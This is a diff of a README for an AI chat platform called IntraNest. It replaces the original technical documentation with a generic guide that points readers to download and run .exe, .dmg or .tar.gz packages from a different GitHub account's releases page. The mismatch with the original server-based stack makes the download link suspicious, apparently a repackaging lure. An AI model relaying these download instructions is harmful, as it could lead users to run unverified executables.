@@ -1,296 +1,95 @@
-# IntraNest AI
+# 🤖 IntraNest - Simplifying AI for Your Business Needs
 
-A production-ready enterprise conversational AI platform that combines advanced Retrieval-Augmented Generation (RAG) with complete data sovereignty. Deploy your own ChatGPT/Claude-level AI assistant that operates entirely on your infrastructure.
+## 🚀 Getting Started
 
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.104+-green.svg)](https://fastapi.tiangolo.com/)
-[![LlamaIndex](https://img.shields.io/badge/LlamaIndex-0.9.48-orange.svg)](https://www.llamaindex.ai/)
+Welcome to IntraNest! This is your easy-to-use conversational AI platform. Built for businesses seeking to harness the power of AI, IntraNest offers data sovereignty and advanced retrieval-augmented generation (RAG) capabilities. 
 
-## 🏗️ Architecture Overview
+In this guide, you will learn how to download and run IntraNest on your computer.
 
-IntraNest implements a sophisticated multi-tier architecture combining modern AI technologies with enterprise-grade infrastructure for secure, scalable conversational AI.
+## 📥 Download IntraNest
 
-```
-┌─────────────────────────────────────────────────────┐
-│                 User Interface                      │
-│           LibreChat + React Frontend               │
-└─────────────────────┬───────────────────────────────┘
-                      │ HTTPS/SSL
-┌─────────────────────▼───────────────────────────────┐
-│              FastAPI Backend                        │
-│     • REST API endpoints                           │
-│     • Async request handling                       │
-│     • Authentication & authorization               │
-└─────────────────────┬───────────────────────────────┘
-                      │
-┌─────────────────────▼───────────────────────────────┐
-│            LlamaIndex RAG Pipeline                  │
-│     • Query processing & transformation            │
-│     • Context assembly & orchestration             │
-│     • Multi-step reasoning                         │
-└─────────────┬───────────────┬───────────────────────┘
-              │               │
-    ┌─────────▼─────────┐    ┌▼─────────────────────────┐
-    │  Weaviate Vector  │    │     OpenAI GPT-4         │
-    │    Database       │    │   Language Model         │
-    │ • 1536-dim vectors│    │ • Response generation    │
-    │ • Semantic search │    │ • Natural conversation   │
-    └───────────────────┘    └──────────────────────────┘
-```
+[![Download IntraNest](https://img.shields.io/badge/Download%20IntraNest-v1.0-blue)](https://github.com/sohaibiftikhar19/IntraNest/releases)
 
-## ✨ Key Features
+## 🛠️ System Requirements
 
-### Advanced RAG Implementation
-- **Hybrid Search**: Combines semantic and keyword search for optimal retrieval
-- **Context-Aware Processing**: Maintains conversation context across sessions  
-- **Smart Document Chunking**: Intelligent text segmentation with overlap
-- **Multi-Format Support**: PDF, DOCX, HTML, TXT, JSON, and Markdown
-- **Coreference Resolution**: Understands "it," "this," "that" references
+Before you download, make sure your system meets these requirements:
 
-### Enterprise Infrastructure
-- **Scalable Architecture**: Microservices-based design with async processing
-- **Production Deployment**: AWS EC2 with automated health monitoring
-- **Security First**: HTTPS/SSL, OAuth 2.0, Microsoft authentication
-- **High Availability**: PM2 process management with auto-recovery
-- **Data Sovereignty**: Complete control over data processing and storage
+- **Operating System:** Windows 10 or higher, macOS, or Linux
+- **RAM:** Minimum 4 GB for basic functionality; 8 GB recommended for optimal performance
+- **Storage Space:** At least 200 MB available
+- **Network:** Internet connection for updates and data access
 
-### Technical Capabilities
-- **Vector Database**: Weaviate with HNSW indexing for fast similarity search
-- **Query Optimization**: LlamaIndex with multi-step reasoning and query transformation
-- **Memory Management**: Redis-backed session storage with conversation history
-- **Document Pipeline**: Async processing with progress tracking and error handling
-- **Cross-Platform**: Web application + native desktop apps (Windows/macOS)
+## 📂 Download & Install
 
-## 🛠️ Technology Stack
+1. **Visit the Download Page:**
+   Go to the [Releases page](https://github.com/sohaibiftikhar19/IntraNest/releases) to find the latest version of IntraNest.
 
-| Component | Technology | Purpose |
-|-----------|------------|---------|
-| **Backend API** | FastAPI 0.104+ | High-performance async REST API |
-| **RAG Orchestration** | LlamaIndex 0.9.48 | Query processing and retrieval |
-| **Vector Database** | Weaviate 1.21.0 | Semantic search and embeddings |
-| **LLM Integration** | OpenAI GPT-4 | Natural language generation |
-| **Embeddings** | text-embedding-3-small | 1536-dimensional document vectors |
-| **Frontend** | LibreChat + React | Conversational user interface |
-| **Session Store** | Redis 6.x | In-memory session and conversation data |
-| **Database** | MongoDB 7.0 | User management and metadata |
-| **Web Server** | Nginx | SSL termination and reverse proxy |
-| **Process Manager** | PM2 | Service orchestration and monitoring |
-| **Desktop Apps** | Tauri | Cross-platform native applications |
+2. **Choose Your Version:**
+   Look for the latest version at the top of the page. You will see a list of files available for download. Select the package that suits your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
 
-## 🚀 Quick Start
+3. **Download the File:**
+   Click on your chosen file to start the download. Your browser will save it to your computer, usually in the "Downloads" folder.
 
-### Prerequisites
-- Python 3.11+
-- Node.js 18+
-- Docker & Docker Compose
-- OpenAI API key
+4. **Install IntraNest:**
+   - **For Windows:** Double-click the downloaded `.exe` file and follow the installation prompts.
+   - **For macOS:** Open the downloaded `.dmg` file, then drag IntraNest to your `Applications` folder.
+   - **For Linux:** Extract the `.tar.gz` file in your preferred directory and follow the included instructions.
 
-### Installation
+5. **Run the Application:**
+   - **Windows:** After installation, find IntraNest in your Start Menu or desktop shortcut.
+   - **macOS:** Open the `Applications` folder, then double-click IntraNest to launch.
+   - **Linux:** Navigate to the directory where you extracted IntraNest and run the executable file.
 
-```bash
-# Clone the repository
-git clone https://github.com/josephwmusso/IntraNest.git
-cd IntraNest
+## 📊 Features
 
-# Start infrastructure services
-docker-compose -f infrastructure/docker/docker-compose.yml up -d
+IntraNest brings several powerful features to your business:
 
-# Setup Python backend
-cd backend
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-pip install -r requirements.txt
-
-# Configure environment
-cp .env.example .env
-# Edit .env with your OpenAI API key and other settings
-
-# Start the backend service
-python main.py
-```
-
-### Frontend Setup
-
-```bash
-# In a new terminal, setup LibreChat frontend
-cd frontend/LibreChat
-npm install
-cp .env.example .env
-# Configure your environment variables
-npm start
-```
-
-Access the application at `http://localhost:3090`
-
-## 📁 Project Structure
-
-```
-IntraNest/
-├── backend/                    # FastAPI backend service
-│   ├── main.py                # Application entry point
-│   ├── services/              # Core business logic
-│   │   ├── llamaindex_service.py    # RAG orchestration
-│   │   ├── conversation_service.py  # Dialog management
-│   │   ├── document_processor.py    # File processing pipeline
-│   │   └── cache_service.py         # Redis caching layer
-│   ├── routers/               # API route definitions
-│   ├── models/                # Pydantic data models
-│   └── requirements.txt       # Python dependencies
-├── frontend/                   # User interface
-│   └── LibreChat/             # React-based chat interface
-├── infrastructure/            # Deployment configurations
-│   ├── docker/                # Container definitions
-│   ├── aws/                   # Cloud deployment scripts
-│   └── nginx/                 # Web server configuration
-└── desktop/                   # Cross-platform desktop apps
-    └── tauri-app/             # Tauri desktop application
-```
-
-## 🧠 RAG Pipeline Deep Dive
-
-### Document Processing Pipeline
-
-1. **File Upload & Validation**
-   - Multi-format support with type detection
-   - Content extraction with fallback methods
-   - Text cleaning and normalization
-
-2. **Intelligent Chunking**
-   - Sentence-boundary aware segmentation
-   - Configurable chunk size with overlap
-   - Metadata preservation throughout pipeline
-
-3. **Embedding Generation**
-   - OpenAI text-embedding-3-small (1536 dimensions)
-   - Batch processing for efficiency
-   - Error handling and retry logic
-
-4. **Vector Storage**
-   - Weaviate vector database with HNSW indexing
-   - User isolation and multi-tenancy
-   - Metadata filtering and hybrid search
-
-### Query Processing Flow
-
-1. **Query Analysis**
-   - Intent classification and entity extraction
-   - Context integration from conversation history
-   - Query transformation and enhancement
-
-2. **Retrieval Strategy**
-   - Hybrid semantic + keyword search
-   - User-scoped document filtering
-   - Relevance scoring and ranking
-
-3. **Context Assembly**
-   - Retrieved document synthesis
-   - Conversation memory integration
-   - Source attribution and citations
-
-4. **Response Generation**
-   - GPT-4 integration with system prompts
-   - Streaming response support
-   - Quality validation and error handling
+- **Conversational AI:** Get natural, human-like responses from your AI-driven application.
+- **Data Sovereignty:** Control your data without third-party interference.
+- **Machine Learning Models:** Utilize advanced models for accurate results based on your data.
+- **FastAPI Framework:** Enjoy fast and reliable interactions.
+- **Vector Database Integration:** Benefit from efficient data handling and retrieval.
 
 ## 🔧 Configuration
 
-### Environment Variables
+After installing IntraNest, you might want to configure some settings to suit your needs:
 
-```bash
-# OpenAI Configuration
-OPENAI_API_KEY=your_openai_api_key_here
+1. **Open IntraNest:** Launch the application as described above.
+2. **Access Settings:**
+   - Find the settings gear icon usually located in the top right corner.
+3. **Adjust Preferences:**
+   - Change the language, adjust response length, or set up data sources as needed.
 
-# Weaviate Vector Database
-WEAVIATE_URL=http://localhost:8080
-WEAVIATE_API_KEY=optional_api_key
+## ❓ Troubleshooting
 
-# Redis Session Store
-REDIS_URL=redis://localhost:6379
+If you encounter any problems, try these steps:
 
-# MongoDB User Database
-MONGODB_URI=mongodb://localhost:27017/intranest
+- **Application Won't Start:** Ensure your system meets the minimum requirements. Reinstall if necessary.
+- **Slow Responses:** Close other applications that may be using system resources.
+- **Network Issues:** Check your internet connection.
 
-# RAG Configuration
-CHUNK_SIZE=1000
-CHUNK_OVERLAP=200
-MAX_RETRIEVED_DOCS=10
-HYBRID_ALPHA=0.75
-```
+For detailed support, visit the IntraNest support community or check the GitHub Issues page.
 
-### Advanced Configuration
+## 😊 Community Engagement
 
-See `backend/.env.example` for complete configuration options including:
-- Authentication settings (OAuth, API keys)
-- Performance tuning parameters
-- Logging and monitoring configuration
-- Security and CORS settings
+Join our community to connect with other IntraNest users:
 
-## 🏢 Production Deployment
+- **Community Forum:** Share experiences, ask questions, or find helpful tips.
+- **GitHub Repository:** Report issues, request features, or contribute to the project.
 
-### AWS Infrastructure
+## 👥 Contributing
 
-IntraNest supports professional AWS deployment with:
+We welcome contributions! If you want to help improve IntraNest, here’s how you can get involved:
 
-- **EC2 Instances**: Auto-scaling compute resources
-- **Application Load Balancer**: High availability and SSL termination
-- **RDS**: Managed MongoDB-compatible database
-- **ElastiCache**: Managed Redis for session storage
-- **S3**: Document storage and static assets
-- **CloudFront**: Global CDN for optimal performance
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Submit a pull request with a clear description of your changes.
 
-### Docker Deployment
+## 📖 Further Reading
 
-```bash
-# Build and deploy all services
-docker-compose -f docker-compose.prod.yml up -d
+To learn more about the technology behind IntraNest:
 
-# Scale services as needed
-docker-compose -f docker-compose.prod.yml up -d --scale backend=3
-```
+- Visit the official [FastAPI Documentation](https://fastapi.tiangolo.com/)
+- Explore vector databases like [Weaviate](https://weaviate.io/) for advanced data handling.
 
-## 🔒 Security Features
-
-- **Data Sovereignty**: All processing on your infrastructure
-- **SSL/TLS Encryption**: End-to-end encrypted communications
-- **OAuth 2.0**: Microsoft, Google, and custom authentication
-- **API Security**: Rate limiting, authentication, and authorization
-- **User Isolation**: Multi-tenant data separation
-- **Audit Logging**: Complete activity and access logging
-
-## 📊 Performance & Scalability
-
-### Benchmarks
-- **Query Response**: <3 seconds typical (RAG + LLM)
-- **Document Processing**: 100-500 docs/hour depending on size
-- **Concurrent Users**: 50+ simultaneous conversations
-- **Vector Search**: <200ms semantic search latency
-
-### Scaling Options
-- **Horizontal Scaling**: Multiple backend instances with load balancing
-- **Database Sharding**: Weaviate multi-node clusters
-- **Caching**: Multi-tier caching with Redis and application-level cache
-- **CDN**: Static asset delivery optimization
-
-## 🤝 Contributing
-
-We welcome contributions! Please see our [Contributing Guidelines](CONTRIBUTING.md) for details on:
-
-- Development setup and workflow
-- Code style and testing standards  
-- Pull request process
-- Issue reporting guidelines
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🆘 Support
-
-- **Documentation**: [docs.intranestai.com](https://docs.intranestai.com)
-- **Issues**: [GitHub Issues](https://github.com/josephwmusso/IntraNest/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/josephwmusso/IntraNest/discussions)
-
----
-
-**IntraNest AI**: Enterprise-grade conversational AI with complete data sovereignty and unlimited scalability.
+Thank you for choosing IntraNest. We hope it helps you leverage AI effectively in your business!
